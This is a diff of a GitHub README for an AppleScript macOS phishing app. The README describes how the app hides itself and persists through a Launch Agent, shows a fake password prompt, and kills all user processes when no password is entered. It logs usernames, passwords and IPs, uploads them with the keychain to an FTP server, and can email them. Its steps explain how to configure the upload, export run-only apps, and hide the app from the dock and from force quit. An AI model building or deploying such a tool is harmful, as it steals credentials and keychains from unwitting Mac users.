@@ -8,7 +8,7 @@ This is a phishing app that I wrote. It is written in applescript, which is impo
 ###Here's what it does:
 
 * It checks for a killswitch, then creates a hidden folder in the user's Public folder.
-* It copies a duplicate app to the hidden folder and sets it as a login item.
+* It copies a duplicate app to the hidden folder and creates a Launch Agent (to make the app start on login).
 * It prompts the user to enter their password into a dialog box. If the user doesn't enter it within 10 seconds, the script kills all user processes, making the user have to log out in order to use the computer.
 ![image](http://f.cl.ly/items/3E0x2P0l452W2B1p2T0m/Prompt.png)
 * If the password is entered correctly, the script copies the user's username, password, date, WAN IP, and LAN IP to a text file in the hidden folder.
@@ -20,9 +20,9 @@ This is a phishing app that I wrote. It is written in applescript, which is impo
 
 ###Please feel free to test the script by doing the following:
 
-If you don't want your app to upload the text file and the keychain to an FTP server, you can just download "[Ready To Use App](https://github.com/benb116/Gone-Phishing/blob/master/Ready%20To%20Use%20App.zip)" and unzip it.
+If you don't want your app to upload the text file and the keychain to an FTP server, and you don't want to actually send the email, you can just download "[Ready To Use App](https://github.com/benb116/Gone-Phishing/blob/master/Ready%20To%20Use%20App.zip)" and unzip it.
 
-If you do want an FTP server, follow the steps below.
+If you do want to upload to an FTP server and/or send out the email, follow the steps below.
 
 1. Copy "App.applescript", "Updater.applescript", "DK.applescript", and "icon.icns" to your computer.
 2. Open 'App.applescript' and 'Updater.applescript' in AppleScript Editor and find the FTP command properties.
@@ -32,15 +32,13 @@ If you do want an FTP server, follow the steps below.
 		
 	becomes
 	
-		set myuser to "Benb116"		set mypass to "12345"		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"3. Optional: in App.applescript, find the comment "--send theMessage." Remove the "--" to make this an actual command that will actually send out the email.4. Export "App.applescript", "Updater.applescript", and "DK.applescript" as **run-only** applications. 
+		set myuser to "Benb116"		set mypass to "12345"		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"4. Optional: in App.applescript, find the comment "--send theMessage." Remove the "--" to make this an actual command that will actually send out the email.5. Export "App.applescript", "Updater.applescript", and "DK.applescript" as **run-only** applications. 
 	* "Updater.applescript" and "DK.applescript" **must** be made into apps named "Updater" and "DK" respectively. You can name "App.app" whatever you want.
 	
-4. In each app, open "appname.app/contents/Info.plist" in TextEdit.
-5. Add the folowing two lines of code to the "Info.plist" file
+6. Run the following Terminal commands **with each app**:
 
-		<key>NSUIElement</key>
- 		<string>1</string>
+		defaults write <app path>/Contents/Info.plist 'NSUIElement' '1'
 (this prevents a dock icon from appearing and also makes it impossible to force quit the app)
-5. Add "icon.icns" to the resources folders of "App.app" and "Updater.app"
+7. Add "icon.icns" to the resources folders of "App.app" and "Updater.app"
 8. Copy Updater.app and DK.app to the resources folder of "App.app"
 
